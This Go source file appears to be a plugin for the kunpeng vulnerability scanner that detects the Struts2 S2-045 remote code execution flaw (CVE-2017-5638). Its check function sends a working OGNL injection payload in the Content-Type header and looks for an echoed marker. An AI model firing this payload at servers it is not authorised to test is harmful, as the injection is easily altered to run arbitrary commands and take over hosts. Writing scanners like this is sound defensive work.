package goplugin

import (
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type struts2_45 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("struts2", &struts2_45{})
}
func (d *struts2_45) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Struts2 s2-045 远程代码执行",
		Remarks: "攻击者可通过构造HTTP请求头中的Content-Type值进行远程代码执行，导致服务器被入侵控制。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://www.anquanke.com/post/id/85744",
			CVE:  "CVE-2017-5638",
			KPID: "KP-0041",
		},
	}
	return d.info
}
func (d *struts2_45) GetResult() []plugin.Plugin {
	return d.result
}
func (d *struts2_45) Check(URL string, meta plugin.TaskMeta) (b bool) {
	request, err := http.NewRequest("GET", URL, nil)
	request.Header.Set("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."+
		"(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2."+
		"ServletActionContext@getResponse().getWriter()).(#o.println('['+'safetest'+']')).(#o.close())}")
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "[safetest]") {
		result := d.info
		result.Response = resp.RequestRaw
		result.Request = resp.ResponseRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
